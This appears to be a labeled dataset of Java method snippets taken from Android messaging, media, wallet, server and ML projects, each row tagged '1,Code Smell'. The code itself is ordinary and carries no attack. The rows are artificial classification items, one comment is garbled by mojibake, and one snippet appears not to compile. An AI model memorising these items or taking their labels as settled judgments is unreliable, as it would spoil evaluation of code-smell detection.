            mediaItem=mediaItem.buildUpon().setSubtitleConfigurations(Collections.singletonList(subtitle)).build();
            PlayerActivity.player.setMediaItem(mediaItem,false);
            if (BuildConfig.DEBUG) {
              Toast.makeText(activity,""Subtitle found"",Toast.LENGTH_SHORT).show();
            }
          }
        }
      }
);
    }
 catch (    IOException e) {
      Utils.log(e.toString());
      e.printStackTrace();
    }
  }
).start();
}",1,Code Smell
"private Optional<DataChangeEvent> processDataChangeEvent(DataChangeEvent dataChangeEvent) throws Exception {
  TableId tableId=dataChangeEvent.tableId();
  List<Optional<DataChangeEvent>> transformedDataChangeEventOptionalList=new ArrayList<>();
  long epochTime=System.currentTimeMillis();
  for (  Tuple4<Selectors,Optional<TransformProjection>,Optional<TransformFilter>,Boolean> transform : transforms) {
    Selectors selectors=transform.f0;
    Boolean isPreProjection=transform.f3;
    if (selectors.isMatch(tableId)) {
      Optional<DataChangeEvent> dataChangeEventOptional=Optional.of(dataChangeEvent);
      Optional<TransformProjection> transformProjectionOptional=transform.f1;
      if (isPreProjection && transformProjectionOptional.isPresent() && transformProjectionOptional.get().isValid()) {
        TransformProjection transformProjection=transformProjectionOptional.get();
        if (!transformProjectionProcessorMap.containsKey(Tuple2.of(tableId,transformProjection)) || !transformProjectionProcessorMap.get(Tuple2.of(tableId,transformProjection)).hasTableInfo()) {
          transformProjectionProcessorMap.put(Tuple2.of(tableId,transformProjection),TransformProjectionProcessor.of(getTableInfoFromSchemaEvolutionClient(tableId),transformProjection,timezone));
        }
        TransformProjectionProcessor transformProjectionProcessor=transformProjectionProcessorMap.get(Tuple2.of(tableId,transformProjection));
        dataChangeEventOptional=processProjection(transformProjectionProcessor,dataChangeEventOptional.get(),epochTime);
      }
      Optional<TransformFilter> transformFilterOptional=transform.f2;
      if (transformFilterOptional.isPresent() && transformFilterOptional.get().isVaild()) {
        TransformFilter transformFilter=transformFilterOptional.get();
        if (!transformFilterProcessorMap.containsKey(Tuple2.of(tableId,transformFilter))) {
          transformFilterProcessorMap.put(Tuple2.of(tableId,transformFilter),TransformFilterProcessor.of(getTableInfoFromSchemaEvolutionClient(tableId),transformFilter,timezone));
        }
        TransformFilterProcessor transformFilterProcessor=transformFilterProcessorMap.get(Tuple2.of(tableId,transformFilter));
        dataChangeEventOptional=processFilter(transformFilterProcessor,dataChangeEventOptional.get(),epochTime);
      }
      if (!isPreProjection && dataChangeEventOptional.isPresent() && transformProjectionOptional.isPresent()&& transformProjectionOptional.get().isValid()) {
        TransformProjection transformProjection=transformProjectionOptional.get();
        if (!transformProjectionProcessorMap.containsKey(Tuple2.of(tableId,transformProjection)) || !transformProjectionProcessorMap.get(Tuple2.of(tableId,transformProjection)).hasTableInfo()) {
          transformProjectionProcessorMap.put(Tuple2.of(tableId,transformProjection),TransformProjectionProcessor.of(getTableInfoFromSchemaEvolutionClient(tableId),transformProjection,timezone));
        }
        TransformProjectionProcessor transformProjectionProcessor=transformProjectionProcessorMap.get(Tuple2.of(tableId,transformProjection));
        dataChangeEventOptional=processProjection(transformProjectionProcessor,dataChangeEventOptional.get(),epochTime);
      }
      transformedDataChangeEventOptionalList.add(dataChangeEventOptional);
    }
  }
  if (transformedDataChangeEventOptionalList.isEmpty()) {
    return Optional.of(dataChangeEvent);
  }
 else {
    for (    Optional<DataChangeEvent> dataChangeEventOptional : transformedDataChangeEventOptionalList) {
      if (dataChangeEventOptional.isPresent()) {
        return dataChangeEventOptional;
      }
    }
    return Optional.empty();
  }
}",1,Code Smell
"/** 
 * 琛ュ厖 閮ㄥ垎寮曠敤鐨� detail copyFromStepId 鐨� detail isNew 鐨勮祫婧愮殑 detail
 */
private void addSpecialStepDetails(List<ApiScenarioStepRequest> steps,Map<String,Object> stepDetails){
  if (CollectionUtils.isEmpty(steps)) {
    return;
  }
  Map<String,String> copyFromStepIdMap=new HashMap<>();
  Map<String,String> isNewApiResourceMap=new HashMap<>();
  Map<String,String> isNewApiCaseResourceMap=new HashMap<>();
  traversalStepTree(steps,(step) -> {
    ApiScenarioStepRequest stepRequest=(ApiScenarioStepRequest)step;
    addPartialRefStepDetail(stepDetails,step);
    if (stepDetails.get(stepRequest.getId()) == null && hasDetail(step)) {
      if (isApiOrCase(step) && BooleanUtils.isTrue(((ApiScenarioStepRequest)step).getIsNew())) {
        if (isApi(step.getStepType())) {
          isNewApiResourceMap.put(step.getId(),step.getResourceId());
        }
 else {
          isNewApiCaseResourceMap.put(step.getId(),step.getResourceId());
        }
      }
 else       if (StringUtils.isNotBlank(stepRequest.getCopyFromStepId())) {
        if (stepDetails.containsKey(stepRequest.getCopyFromStepId())) {
          stepDetails.put(step.getId(),stepDetails.get(stepRequest.getCopyFromStepId()));
        }
 else {
          copyFromStepIdMap.put(stepRequest.getId(),stepRequest.getCopyFromStepId());
        }
      }
    }
    if (isRefOrPartialRef(step.getRefType())) {
      return false;
    }
    return true;
  }
);
  putCopyStepDetails(stepDetails,isNewApiResourceMap,(subIds,copyFromBlobMap) -> {
    apiDefinitionService.getBlobByIds(subIds).forEach(apiDefinitionBlob -> copyFromBlobMap.put(apiDefinitionBlob.getId(),apiDefinitionBlob.getRequest()));
  }
);
  putCopyStepDetails(stepDetails,isNewApiCaseResourceMap,(subIds,copyFromBlobMap) -> {
    apiTestCaseService.getBlobByIds(subIds).forEach(apiTestCaseBlob -> copyFromBlobMap.put(apiTestCaseBlob.getId(),apiTestCaseBlob.getRequest()));
  }
);
  putCopyStepDetails(stepDetails,copyFromStepIdMap,(subIds,copyFromBlobMap) -> {
    ApiScenarioStepBlobExample example=new ApiScenarioStepBlobExample();
    example.createCriteria().andIdIn(subIds);
    apiScenarioStepBlobMapper.selectByExampleWithBLOBs(example).forEach(scenarioStepBlob -> copyFromBlobMap.put(scenarioStepBlob.getId(),scenarioStepBlob.getContent()));
  }
);
}
",1,Code Smell
"@Override public boolean dispatchTouchEvent(MotionEvent ev){
  if (recording && currentRecorder != null && currentRecorder.cameraView != null && flipButton != null) {
    AndroidUtilities.rectTmp.set(flipButton.getBounds());
    AndroidUtilities.rectTmp.inset(-dp(12),-dp(12));
    for (int i=0; i < ev.getPointerCount(); ++i) {
      if (AndroidUtilities.rectTmp.contains(ev.getX(i),ev.getY(i))) {
        if (ev.getAction() == MotionEvent.ACTION_DOWN || ev.getActionMasked() == MotionEvent.ACTION_POINTER_DOWN) {
          currentRecorder.cameraView.switchCamera();
          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && flipButton instanceof AnimatedVectorDrawable) {
            ((AnimatedVectorDrawable)flipButton).start();
          }
        }
        if (!recordTouch) {
          return true;
        }
        break;
      }
    }
  }
  AndroidUtilities.rectTmp.set(roundButton.getX(),roundButton.getY(),roundButton.getX() + roundButton.getMeasuredWidth(),roundButton.getY() + roundButton.getMeasuredHeight());
  if (recordTouch || !hasRoundVideo && !keyboardShown && AndroidUtilities.rectTmp.contains(ev.getX(),ev.getY())) {
    return roundButtonTouchEvent(ev);
  }
  if (recording && locked && cancelBounds.contains(ev.getX(),ev.getY())) {
    releaseRecord(false,true);
    recordTouch=false;
    return true;
  }
  if (recording && (lockBounds.contains(ev.getX(),ev.getY()) || getBounds().contains(ev.getX(),ev.getY()))) {
    releaseRecord(false,false);
    recordTouch=false;
    return true;
  }
  return super.dispatchTouchEvent(ev);
}",1,Code Smell
"private void loadWallPaperFromServer(){
  for (  WallPaperInfo info : wallPaperInfo) {
    if (info.wallPaper != null) {
      continue;
    }
    if (!info.emoticon.isEmpty()) {
      TLRPC.TL_wallPaperNoFile wallpaper=new TLRPC.TL_wallPaperNoFile();
      wallpaper.id=0;
      wallpaper.isDefault=false;
      wallpaper.dark=false;
      wallpaper.flags|=4;
      wallpaper.settings=info.parseSettings();
      info.flags|=1;
      info.wallPaper=wallpaper;
    }
  }
  for (  WallPaperInfo info : wallPaperInfo) {
    if (info.wallPaper != null) {
      continue;
    }
    if (info.slug != null && !info.slug.isEmpty()) {
      TLRPC.TL_account_getWallPaper req=new TLRPC.TL_account_getWallPaper();
      TLRPC.TL_inputWallPaperSlug inputWallPaperSlug=new TLRPC.TL_inputWallPaperSlug();
      inputWallPaperSlug.slug=info.slug;
      req.wallpaper=inputWallPaperSlug;
      getConnectionsManager().sendRequest(req,(response,error1) -> {
        if (error1 == null) {
          if (response instanceof TLRPC.TL_wallPaper) {
            info.flags|=1;
            info.wallPaper=(TLRPC.WallPaper)response;
            info.wallPaper.flags|=4;
            info.wallPaper.settings=info.parseSettings();
            saveWallPaperInfo();
          }
        }
      }
);
    }
  }
  saveWallPaperInfo();
}",1,Code Smell
"public CraftWorld getWorld(){
  if (this.world == null) {
    Optional<Field> delegate=WrappedWorlds.getDelegate(this.getClass());
    if (delegate.isPresent()) {
      try {
        return ((WorldBridge)delegate.get().get(this)).bridge$getWorld();
      }
 catch (      IllegalAccessException e) {
        throw new RuntimeException(e);
      }
    }
    if (environment == null) {
      environment=ArclightServer.getEnvironment(this.getTypeKey());
    }
    if (generator == null) {
      generator=getCraftServer().getGenerator(((ServerLevelData)this.getLevelData()).getLevelName());
      if (generator != null && (Object)this instanceof ServerLevel) {
        org.bukkit.generator.WorldInfo worldInfo=new CraftWorldInfo((ServerLevelData)getLevelData(),((ServerWorldBridge)this).bridge$getConvertable(),environment,this.dimensionType());
        if (biomeProvider == null && generator != null) {
          biomeProvider=generator.getDefaultBiomeProvider(worldInfo);
        }
        var generator=serverWorld.getChunkSource().getGenerator();
        if (biomeProvider != null) {
          BiomeSource biomeSource=new CustomWorldChunkManager(worldInfo,biomeProvider,serverWorld.registryAccess().registryOrThrow(Registries.BIOME));
          ((ChunkGeneratorBridge)generator).bridge$setBiomeSource(biomeSource);
        }
        CustomChunkGenerator gen=new CustomChunkGenerator(serverWorld,generator,this.generator);
        ((ServerChunkProviderBridge)serverWorld.getChunkSource()).bridge$setChunkGenerator(gen);
      }
    }
    this.world=new CraftWorld((ServerLevel)(Object)this,generator,biomeProvider,environment);
    getCraftServer().addWorld(this.world);
  }
  return this.world;
}
",1,Code Smell
"private void subscript(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv,Context context,Function callFunc){
  if (callFunc.getParameterCount() != 2) {
    Logging.error(""Wrong parameter for: "" + callFunc);
    return;
  }
  ALoc retALoc=getReturnALoc(callFunc,true);
  if (retALoc == null) {
    return;
  }
  KSet thisKSet=getParamKSet(callFunc,0,inOutEnv);
  KSet indexKSet=getParamKSet(callFunc,1,inOutEnv);
  if (!thisKSet.isNormal()) {
    return;
  }
  KSet resKSet=new KSet(GlobalState.arch.getDefaultPointerSize() * 8);
  for (  AbsVal thisPtrAbsVal : thisKSet) {
    ALoc thisPtrALoc=ALoc.getALoc(thisPtrAbsVal.getRegion(),thisPtrAbsVal.getValue(),GlobalState.arch.getDefaultPointerSize());
    ArrayList<KSet> thisContainer=getContainer(thisPtrALoc);
    if (indexKSet.isNormal()) {
      for (      AbsVal idxAbsVal : indexKSet) {
        if (idxAbsVal.isBigVal()) {
          continue;
        }
        long idx=idxAbsVal.getValue();
        if (idx > thisContainer.size() - 1) {
          continue;
        }
        KSet oldKSet=thisContainer.get((int)idx);
        if (oldKSet != null) {
          KSet tmp=resKSet.join(oldKSet);
          resKSet=(tmp == null) ? resKSet : tmp;
        }
      }
    }
    if (resKSet.isBot()) {
      for (      KSet value : thisContainer) {
        KSet tmp=resKSet.join(value);
        resKSet=(tmp == null) ? resKSet : tmp;
      }
    }
  }
  inOutEnv.set(retALoc,resKSet,true);
}",1,Code Smell
"@Override public void postConfig() throws PropertyException {
  try {
    env=OrtEnvironment.getEnvironment();
    OrtSession.SessionOptions options=new OrtSession.SessionOptions();
    if (useCUDA) {
      options.addCUDA();
    }
    session=env.createSession(modelPath.toString(),options);
    Map<String,NodeInfo> outputs=session.getOutputInfo();
    if (outputs.size() != 2) {
      throw new PropertyException("""",""modelPath"",""Invalid model, expected 2 outputs, found "" + outputs.size());
    }
 else {
      NodeInfo outputZero=outputs.get(TOKEN_OUTPUT);
      if ((outputZero == null) || !(outputZero.getInfo() instanceof TensorInfo)) {
        throw new PropertyException("""",""modelPath"",""Invalid model, expected to find tensor output called '"" + TOKEN_OUTPUT + ""'"");
      }
 else {
        TensorInfo outputZeroTensor=(TensorInfo)outputZero.getInfo();
        long[] shape=outputZeroTensor.getShape();
        if (shape.length != 3) {
          throw new PropertyException("""",""modelPath"",""Invalid model, expected to find "" + TOKEN_OUTPUT + "" with 3 dimensions, found :""+ Arrays.toString(shape));
        }
 else {
          bertDim=(int)shape[2];
        }
      }
      NodeInfo outputOne=outputs.get(CLS_OUTPUT);
      if ((outputOne == null) || !(outputOne.getInfo() instanceof TensorInfo)) {
        throw new PropertyException("""",""modelPath"",""Invalid model, expected to find tensor output called '"" + CLS_OUTPUT + ""'"");
      }
 else {
        TensorInfo outputOneTensor=(TensorInfo)outputOne.getInfo();
        long[] shape=outputOneTensor.getShape();
        if (shape.length != 2) {
          throw new PropertyException("""",""modelPath"",""Invalid model, expected to find "" + CLS_OUTPUT + "" with 2 dimensions, found :""+ Arrays.toString(shape));
        }
 else         if (shape[1] != bertDim) {
          throw new PropertyException("""",""modelPath"",""Invalid model, expected to find two outputs with the same embedding dimension, instead found "" + bertDim + "" and ""+ shape[1]);
        }
      }
    }
    Map<String,NodeInfo> inputs=session.getInputInfo();
    if (inputs.size() != 3) {
      throw new PropertyException("""",""modelPath"",""Invalid model, expected 3 inputs, found "" + inputs.size());
    }
 else {
      if (!inputs.containsKey(ATTENTION_MASK)) {
        throw new PropertyException("""",""modelPath"",""Invalid model, expected to find an input called '"" + ATTENTION_MASK + ""'"");
      }
      if (!inputs.containsKey(INPUT_IDS)) {
        throw new PropertyException("""",""modelPath"",""Invalid model, expected to find an input called '"" + INPUT_IDS + ""'"");
      }
      if (!inputs.containsKey(TOKEN_TYPE_IDS)) {
        throw new PropertyException("""",""modelPath"",""Invalid model, expected to find an input called '"" + TOKEN_TYPE_IDS + ""'"");
      }
    }
    featureNames=generateFeatureNames(bertDim);
    TokenizerConfig config=loadTokenizer(tokenizerPath);
    Wordpiece wordpiece=new Wordpiece(config.tokenIDs.keySet(),config.unknownToken,config.maxInputCharsPerWord);
    tokenIDs=config.tokenIDs;
    unknownToken=config.unknownToken;
    classificationToken=config.classificationToken;
    separatorToken=config.separatorToken;
    tokenizer=new WordpieceTokenizer(wordpiece,new WordpieceBasicTokenizer(),config.lowercase,config.stripAccents,Collections.emptySet());
  }
 catch (  OrtException e) {
    throw new PropertyException(e,"""",""modelPath"",""Failed to load model, ORT threw: "");
  }
catch (  IOException e) {
    throw new PropertyException(e,"""",""tokenizerPath"",""Failed to load tokenizer, Jackson threw: "");
  }
}",1,Code Smell
"public void enforce() throws IOException {
  List<CompilationUnit> compilationUnits=new ArrayList<>();
  for (  File dir : dirs) {
    new FileWalker(new DomainModelAnalyzer.ActualFilter(null),(level,path,file) -> {
      compilationUnits.add(FileWalker.silentParse(file));
    }
).walkFrom(dir);
  }
  for (  CompilationUnit compilationUnit : compilationUnits) {
    List<TypeDeclaration<?>> clazzs=compilationUnit.getTypes();
    for (    TypeDeclaration<?> clazz : clazzs) {
      if (!clazz.isClassOrInterfaceDeclaration()) {
        continue;
      }
      ClassOrInterfaceDeclaration extInterface=(ClassOrInterfaceDeclaration)clazz;
      if (!extInterface.isInterface() || !isDomainExtension(extInterface)) {
        continue;
      }
      for (      MethodDeclaration methodDeclaration : extInterface.getMethods()) {
        if (methodDeclaration.getType().isPrimitiveType()) {
          throw new RuntimeException(String.format(""%s#%s returns primitive type, not allowed"",extInterface.getNameAsString(),methodDeclaration.getNameAsString()));
        }
      }
    }
  }
}
",1,Code Smell
"public void setUsersAndDates(ArrayList<Object> localUsers,ArrayList<DateData> dates,boolean archive){
  oldItems.clear();
  oldItems.addAll(usersFilters);
  usersFilters.clear();
  if (localUsers != null) {
    for (int i=0; i < localUsers.size(); i++) {
      Object object=localUsers.get(i);
      if (object instanceof TLRPC.User) {
        TLRPC.User user=(TLRPC.User)object;
        String title;
        if (UserConfig.getInstance(UserConfig.selectedAccount).getCurrentUser().id == user.id) {
          title=LocaleController.getString(""SavedMessages"",R.string.SavedMessages);
        }
 else {
          title=ContactsController.formatName(user.first_name,user.last_name,10);
        }
        MediaFilterData data=new MediaFilterData(R.drawable.search_users_filled,title,null,FILTER_TYPE_CHAT);
        data.setUser(user);
        usersFilters.add(data);
      }
 else       if (object instanceof TLRPC.Chat) {
        TLRPC.Chat chat=(TLRPC.Chat)object;
        String title=chat.title;
        if (chat.title.length() > 12) {
          title=String.format(""%s..."",title.substring(0,10));
        }
        MediaFilterData data=new MediaFilterData(R.drawable.search_users_filled,title,null,FILTER_TYPE_CHAT);
        data.setUser(chat);
        usersFilters.add(data);
      }
    }
  }
  if (dates != null) {
    for (int i=0; i < dates.size(); i++) {
      DateData dateData=dates.get(i);
      MediaFilterData data=new MediaFilterData(R.drawable.search_date_filled,dateData.title,null,FILTER_TYPE_DATE);
      data.setDate(dateData);
      usersFilters.add(data);
    }
  }
  if (archive) {
    FiltersView.MediaFilterData filterData=new FiltersView.MediaFilterData(R.drawable.chats_archive,R.string.ArchiveSearchFilter,null,FiltersView.FILTER_TYPE_ARCHIVE);
    usersFilters.add(filterData);
  }
  if (getAdapter() != null) {
    UpdateCallback updateCallback=new UpdateCallback(getAdapter());
    DiffUtil.calculateDiff(diffUtilsCallback).dispatchUpdatesTo(updateCallback);
    if (!usersFilters.isEmpty() && updateCallback.changed) {
      layoutManager.scrollToPositionWithOffset(0,0);
    }
  }
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.emojiLoaded) {
    if (gridView != null) {
      int count=gridView.getChildCount();
      for (int a=0; a < count; a++) {
        gridView.getChildAt(a).invalidate();
      }
    }
  }
 else   if (id == NotificationCenter.fileUploaded) {
    if (uploadImportStickers == null) {
      return;
    }
    String location=(String)args[0];
    SendMessagesHelper.ImportingSticker sticker=uploadImportStickers.get(location);
    if (sticker != null) {
      sticker.uploadMedia(currentAccount,(TLRPC.InputFile)args[1],() -> {
        if (isDismissed()) {
          return;
        }
        uploadImportStickers.remove(location);
        if (!""application/x-tgsticker"".equals(sticker.mimeType)) {
          removeSticker(sticker);
        }
 else {
          sticker.validated=true;
          int idx=importingStickersPaths.indexOf(sticker);
          if (idx >= 0) {
            RecyclerView.ViewHolder holder=gridView.findViewHolderForAdapterPosition(idx);
            if (holder != null) {
              ((StickerEmojiCell)holder.itemView).setSticker(sticker);
            }
          }
 else {
            adapter.notifyDataSetChanged();
          }
        }
        if (uploadImportStickers.isEmpty()) {
          updateFields();
        }
      }
);
    }
  }
 else   if (id == NotificationCenter.fileUploadFailed) {
    if (uploadImportStickers == null) {
      return;
    }
    String location=(String)args[0];
    SendMessagesHelper.ImportingSticker sticker=uploadImportStickers.remove(location);
    if (sticker != null) {
      removeSticker(sticker);
    }
    if (uploadImportStickers.isEmpty()) {
      updateFields();
    }
  }
}",1,Code Smell
"@Override public void run(){
  if (mSocketFd == null) {
    Log.e(TAG,""Null socket, abort"");
    proxyStatus.postValue(Status.NOT_STARTED);
    return;
  }
  Log.i(TAG,""Receiving data..."");
  try (DataInputStream istream=new DataInputStream(new ParcelFileDescriptor.AutoCloseInputStream(mSocketFd))){
    while (mAddon.isConnected()) {
      String msg_type;
      int port;
      int msg_len;
      long tstamp;
      @SuppressWarnings(""deprecation"") String header=istream.readLine();
      if (header == null) {
        CaptureService.stopService();
        break;
      }
      StringTokenizer tk=new StringTokenizer(header);
      try {
        String tk_tstamp=tk.nextToken("":"");
        String tk_port=tk.nextToken();
        msg_type=tk.nextToken();
        String tk_len=tk.nextToken();
        tstamp=Long.parseLong(tk_tstamp);
        port=Integer.parseInt(tk_port);
        msg_len=Integer.parseInt(tk_len);
      }
 catch (      NoSuchElementException|NumberFormatException e) {
        CaptureService.requireInstance().reportError(""[BUG] Invalid header received from the mitm plugin"");
        CaptureService.stopService();
        break;
      }
      if ((msg_len < 0) || (msg_len > 67108864)) {
        Log.w(TAG,""Ignoring bad message length: "" + msg_len);
        istream.skipBytes(msg_len);
        continue;
      }
      MsgType type=parseMsgType(msg_type);
      byte[] msg;
      try {
        msg=new byte[msg_len];
      }
 catch (      OutOfMemoryError ignored) {
        Log.w(TAG,""Ignoring message causing OOM (length: "" + msg_len + "")"");
        istream.skipBytes(msg_len);
        continue;
      }
      istream.readFully(msg);
      if (type == MsgType.MASTER_SECRET)       logMasterSecret(msg);
 else       if (type == MsgType.LOG) {
        handleLog(msg);
      }
 else       if (type == MsgType.RUNNING) {
        Log.i(TAG,""MITM proxy is running"");
        proxyStatus.postValue(Status.RUNNING);
      }
 else {
        ConnectionDescriptor conn=getConnByLocalPort(port);
        if (conn != null)         handleMessage(conn,type,msg,tstamp);
 else         addPendingMessage(new PendingMessage(type,msg,port,tstamp));
      }
    }
  }
 catch (  IOException e) {
    if (mSocketFd != null)     e.printStackTrace();
  }
 finally {
    Utils.safeClose(mKeylog);
    mKeylog=null;
  }
  if (proxyStatus.getValue() == Status.STARTING)   proxyStatus.postValue(Status.START_ERROR);
 else   proxyStatus.postValue(Status.NOT_STARTED);
  Log.i(TAG,""End receiving data"");
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void delete(Long moduleId,List<Long> dataIds){
  List<ModuleTreeData> moduleTreeDataList=lambdaQuery().eq(ModuleTreeData::getModuleId,moduleId).in(ModuleTreeData::getDataId,dataIds).list();
  lambdaUpdate().eq(ModuleTreeData::getModuleId,moduleId).in(ModuleTreeData::getDataId,dataIds).remove();
  List<ModuleTreeData> childTreeDataToUpdate=new ArrayList<>();
  List<ModuleTreeData> childTreeDataToRemove=new ArrayList<>();
  Set<Long> parentIds=new HashSet<>();
  moduleTreeDataList.stream().filter(p -> StrUtil.isNotEmpty(p.getParentId())).forEach(p -> {
    List<Long> ids=JSON.parseArray(p.getParentId(),Long.class);
    if (CollUtil.isNotEmpty(ids)) {
      parentIds.addAll(ids);
    }
  }
);
  if (CollUtil.isNotEmpty(parentIds)) {
    List<ModuleTreeData> parentTreeDataList=lambdaQuery().eq(ModuleTreeData::getModuleId,moduleId).in(ModuleTreeData::getDataId,parentIds).list();
    for (    ModuleTreeData treeData : parentTreeDataList) {
      String treeDataParentId=treeData.getParentId();
      List<Long> treeDataParentIds=JSON.parseArray(treeDataParentId,Long.class);
      String dataChildId=treeData.getChildId();
      if (StrUtil.isNotEmpty(dataChildId)) {
        List<Long> dataChildIds=JSON.parseArray(dataChildId,Long.class);
        dataChildIds.removeAll(dataIds);
        if (CollUtil.isEmpty(treeDataParentIds) && CollUtil.isEmpty(dataChildIds)) {
          childTreeDataToRemove.add(treeData);
        }
 else {
          treeData.setChildId(JSON.toJSONString(dataChildIds));
          childTreeDataToUpdate.add(treeData);
        }
      }
    }
  }
  Set<Long> childIds=new HashSet<>();
  moduleTreeDataList.stream().filter(p -> StrUtil.isNotEmpty(p.getChildId())).forEach(p -> {
    List<Long> ids=JSON.parseArray(p.getChildId(),Long.class);
    childIds.addAll(ids);
  }
);
  if (CollUtil.isNotEmpty(childIds)) {
    List<ModuleTreeData> childTreeDataList=lambdaQuery().eq(ModuleTreeData::getModuleId,moduleId).in(ModuleTreeData::getDataId,childIds).list();
    for (    ModuleTreeData treeData : childTreeDataList) {
      String treeDataParentId=treeData.getParentId();
      String dataChildId=treeData.getChildId();
      List<Long> dataChildIds=JSON.parseArray(dataChildId,Long.class);
      if (StrUtil.isNotEmpty(treeDataParentId)) {
        List<Long> treeDataParentIds=JSON.parseArray(treeDataParentId,Long.class);
        treeDataParentIds.removeAll(dataIds);
        if (CollUtil.isEmpty(treeDataParentIds) && CollUtil.isEmpty(dataChildIds)) {
          childTreeDataToRemove.add(treeData);
        }
 else {
          treeData.setParentId(JSON.toJSONString(treeDataParentIds));
          childTreeDataToUpdate.add(treeData);
        }
      }
    }
  }
  if (CollUtil.isNotEmpty(childTreeDataToUpdate)) {
    saveOrUpdateBatch(childTreeDataToUpdate);
  }
  if (CollUtil.isNotEmpty(childTreeDataToRemove)) {
    List<Long> toRemoveIdList=childTreeDataToRemove.stream().map(ModuleTreeData::getId).collect(Collectors.toList());
    removeByIds(toRemoveIdList);
  }
}
",1,Code Smell
"@NonNull @Override public RecyclerView.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent,int viewType){
  View view;
  if (viewType == VIEW_TYPE_PAD) {
    view=new View(context);
  }
 else   if (viewType == VIEW_TYPE_USER) {
    view=new SelectorUserCell(context,resourcesProvider,isGreenSelector);
  }
 else   if (viewType == VIEW_TYPE_NO_USERS) {
    StickerEmptyView searchEmptyView=new StickerEmptyView(context,null,StickerEmptyView.STICKER_TYPE_SEARCH,resourcesProvider);
    searchEmptyView.title.setText(LocaleController.getString(""NoResult"",R.string.NoResult));
    searchEmptyView.subtitle.setText(LocaleController.getString(""SearchEmptyViewFilteredSubtitle2"",R.string.SearchEmptyViewFilteredSubtitle2));
    searchEmptyView.linearLayout.setTranslationY(AndroidUtilities.dp(24));
    view=searchEmptyView;
  }
 else   if (viewType == VIEW_TYPE_LETTER) {
    view=new SelectorLetterCell(context,resourcesProvider);
  }
 else   if (viewType == VIEW_TYPE_COUNTRY) {
    view=new SelectorCountryCell(context,resourcesProvider);
  }
 else   if (viewType == VIEW_TYPE_TOP_SECTION) {
    view=new GraySectionCell(context,resourcesProvider);
  }
 else   if (viewType == VIEW_TYPE_BUTTON) {
    TextCell cell=new TextCell(context,resourcesProvider);
    cell.leftPadding=23 - 7;
    cell.imageLeft=19;
    view=cell;
  }
 else {
    view=new View(context);
  }
  return new RecyclerListView.Holder(view);
}",1,Code Smell
"public void initializeView(){
  walletMenu.selectedToggleProperty().addListener((observable,oldValue,selectedToggle) -> {
    if (selectedToggle == null) {
      oldValue.setSelected(true);
      return;
    }
    Function function=(Function)selectedToggle.getUserData();
    boolean existing=false;
    for (    Node walletFunction : walletPane.getChildren()) {
      if (walletFunction.getUserData().equals(function)) {
        existing=true;
        walletFunction.setViewOrder(0);
      }
 else       if (function != Function.LOCK) {
        walletFunction.setViewOrder(1);
      }
    }
    try {
      if (!existing) {
        URL url=AppServices.class.getResource(""wallet/"" + function.toString().toLowerCase(Locale.ROOT) + "".fxml"");
        if (url == null) {
          throw new IllegalStateException(""Cannot find wallet/"" + function.toString().toLowerCase(Locale.ROOT) + "".fxml"");
        }
        FXMLLoader functionLoader=new FXMLLoader(url);
        Node walletFunction=functionLoader.load();
        walletFunction.setUserData(function);
        WalletFormController controller=functionLoader.getController();
        WalletForm walletForm=getWalletForm();
        if (function.equals(Function.SETTINGS)) {
          walletForm=new SettingsWalletForm(getWalletForm().getStorage(),getWalletForm().getWallet(),getWalletForm());
          getWalletForm().setSettingsWalletForm(walletForm);
        }
        controller.setWalletForm(walletForm);
        walletFunction.setViewOrder(1);
        walletPane.getChildren().add(walletFunction);
      }
    }
 catch (    IOException e) {
      throw new IllegalStateException(""Can't find pane"",e);
    }
  }
);
  for (  Toggle toggle : walletMenu.getToggles()) {
    ToggleButton toggleButton=(ToggleButton)toggle;
    toggleButton.managedProperty().bind(toggleButton.visibleProperty());
  }
  walletMenuBox.managedProperty().bind(walletMenuBox.visibleProperty());
  walletMenuBox.visibleProperty().bind(getWalletForm().lockedProperty().not());
  configure(walletForm.getWallet());
}",1,Code Smell
"@Override public int read(byte[] buffer,int offset,int readLength) throws IOException {
  if (readLength == 0) {
    return 0;
  }
  if (bytesRemaining == 0) {
    return C.RESULT_END_OF_INPUT;
  }
  try {
    if (readPosition >= checkCachePosition) {
      openNextSource(true);
    }
    int bytesRead=currentDataSource.read(buffer,offset,readLength);
    if (bytesRead != C.RESULT_END_OF_INPUT) {
      if (isReadingFromCache()) {
        totalCachedBytesRead+=bytesRead;
      }
      readPosition+=bytesRead;
      if (bytesRemaining != C.LENGTH_UNSET) {
        bytesRemaining-=bytesRead;
      }
    }
 else     if (currentDataSpecLengthUnset) {
      setNoBytesRemainingAndMaybeStoreLength();
    }
 else     if (bytesRemaining > 0 || bytesRemaining == C.LENGTH_UNSET) {
      closeCurrentSource();
      openNextSource(false);
      return read(buffer,offset,readLength);
    }
    return bytesRead;
  }
 catch (  IOException e) {
    if (currentDataSpecLengthUnset && CacheUtil.isCausedByPositionOutOfRange(e)) {
      setNoBytesRemainingAndMaybeStoreLength();
      return C.RESULT_END_OF_INPUT;
    }
    handleBeforeThrow(e);
    throw e;
  }
catch (  Throwable e) {
    handleBeforeThrow(e);
    throw e;
  }
}",1,Code Smell
"public Map<Sha256Hash,BlockTransaction> getTransactions(Wallet wallet,Set<BlockTransactionHash> references,Map<Integer,BlockHeader> blockHeaderMap) throws ServerException {
  try {
    Set<BlockTransactionHash> checkReferences=new TreeSet<>(references);
    Set<String> txids=new LinkedHashSet<>(references.size());
    for (    BlockTransactionHash reference : references) {
      txids.add(reference.getHashAsString());
    }
    Map<String,String> result=electrumServerRpc.getTransactions(getTransport(),wallet,txids);
    String strErrorTx=Sha256Hash.ZERO_HASH.toString();
    Map<Sha256Hash,BlockTransaction> transactionMap=new HashMap<>();
    for (    String txid : result.keySet()) {
      Sha256Hash hash=Sha256Hash.wrap(txid);
      String strRawTx=result.get(txid);
      if (strRawTx.equals(strErrorTx)) {
        transactionMap.put(hash,UNFETCHABLE_BLOCK_TRANSACTION);
        checkReferences.removeIf(ref -> ref.getHash().equals(hash));
        continue;
      }
      byte[] rawtx=Utils.hexToBytes(strRawTx);
      Transaction transaction;
      try {
        transaction=new Transaction(rawtx);
      }
 catch (      ProtocolException e) {
        log.error(""Could not parse tx: "" + strRawTx);
        continue;
      }
